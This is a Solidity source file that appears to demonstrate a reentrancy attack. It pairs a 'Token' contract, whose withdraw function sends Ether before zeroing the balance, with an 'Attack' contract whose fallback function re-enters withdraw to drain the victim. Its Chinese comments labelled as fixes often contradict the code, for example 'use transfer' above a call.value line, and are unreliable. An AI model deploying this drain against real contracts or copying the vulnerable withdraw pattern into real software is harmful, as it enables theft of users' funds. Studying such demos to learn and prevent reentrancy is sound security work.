pragma solidity ^0.4.19;

contract Token {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint amount = balances[msg.sender];
        require(amount > 0);

        // 修复：使用 transfer
        require(msg.sender.call.value(amount)()); // 添加 require 确保调用成功

        balances[msg.sender] = 0;
    }
}

contract Attack {
    Token public instance;

    // 修复：constructor 关键字
    function Attack(address _addr) public {
        instance = Token(_addr);
    }

    function attack() external payable {
        // 修复：使用 transfer
        instance.deposit.value(1 ether)();

        // 开始攻击
        instance.withdraw();
    }

    // 修复：使用 view 代替 returns
    function balanceSelf() public view returns(uint256) {
        // 修复：使用 this.balance
        return this.balance;
    }

    // 修复：使用 fallback 函数
    function() external payable {
        if (address(instance).balance >= 1 ether) {
            // 重入
            instance.withdraw();
        }
    }
}
